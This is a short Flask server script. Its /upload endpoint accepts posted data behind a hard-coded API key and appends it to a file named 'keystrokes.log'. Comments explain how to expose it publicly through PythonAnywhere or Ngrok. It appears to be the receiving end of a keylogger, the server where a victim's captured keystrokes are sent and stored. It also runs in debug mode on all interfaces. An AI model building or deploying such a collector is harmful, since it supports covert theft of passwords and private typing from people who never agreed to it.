from flask import Flask, request
import sys

app = Flask(__name__)

API_KEY = "super-secret-sandbox-key-2026"

@app.route('/upload', methods=['POST'])
def upload():
    # Reject any request that doesn't carry the correct API key header.
    if request.headers.get("X-API-Key") != API_KEY:
        print("Forbidden: invalid API key")
        return "Forbidden", 403

    data = request.get_data(as_text=True)
    print(f"Received: {data}")
    sys.stdout.flush()          # Ensure it appears immediately in the terminal

    with open("keystrokes.log", "a") as f:
        f.write(data + "\n")
        f.flush()                # Force write to disk

    return "OK", 200

# When running on PythonAnywhere, the WSGI server imports `app` directly
# and skips this block. If you run via Ngrok on your PC, this block runs.
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)